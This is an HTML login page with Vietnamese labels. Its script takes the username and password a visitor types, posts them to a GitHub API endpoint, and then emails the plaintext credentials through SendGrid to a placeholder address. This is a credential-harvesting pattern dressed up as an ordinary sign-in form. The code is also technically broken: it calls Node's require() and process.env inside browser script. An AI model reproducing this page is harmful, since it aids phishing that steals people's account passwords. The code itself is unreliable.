<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Vui lòng đăng nhập</title>
    <!-- CSS -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <style>
      body {
        font-family: Arial, Helvetica, sans-serif;
      }
      .container {
        margin-top: 30px;
      }
    </style>
  </head>
  <body>
    <!-- Đăng nhập form -->
    <div class="container">
      <h2>Vui lòng đăng nhập</h2>
      <form>
        <div class="form-group">
          <label for="username"><b>Tên đăng nhập</b></label>
          <input type="text" class="form-control" placeholder="Nhập tên đăng nhập" name="username" id="username" required>
        </div>
        <div class="form-group">
          <label for="password"><b>Mật khẩu</b></label>
          <input type="password" class="form-control" placeholder="Nhập mật khẩu" name="password" id="password" required>
        </div>
        <button type="submit" class="btn btn-primary" id="btnLogin">Đăng nhập</button>
      </form>
    </div>

    <!-- JavaScript -->
    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@sendgrid/mail@7.4.0"></script>
    <script>
      const sgMail = require('@sendgrid/mail');
      sgMail.setApiKey(process.env.SENDGRID_API_KEY);

      const form = $('form');
      const btnLogin = $('#btnLogin');

      btnLogin.click((event) => {
        event.preventDefault();

        const username = $('#username').val();
        const password = $('#password').val();

        // Gửi yêu cầu đăng nhập tới server
        $.ajax({
          url: 'https://api.github.com/user',
          type: 'POST',
          data: JSON.stringify({
            login: username,
            password: password
          }),
          contentType: 'application/json',
          success: (response) => {
            console.log(response);

            // Gửi email thông tin đăng nhập
            const fromEmail = 'example@example.com';
            const toEmail = 'example2@example.com';
            const subject = 'Thông tin đăng nhập';
            const text = `Tên đăng nhập: ${username}\nMật khẩu: ${password}`;

            const msg = {
              to: toEmail,
              from: fromEmail,
              subject: subject,
              text: text
            };

            sgMail.send(msg).then(() => {
              console.log('Gửi email thành công');
            }).catch((error) => {
              console.error(error);
            });
          },
          error: (error) => {
            console.error(error);
          }
        });
      });
    </script>

    <!-- JavaScript Bootstrap và Popper -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  </body>
</html>
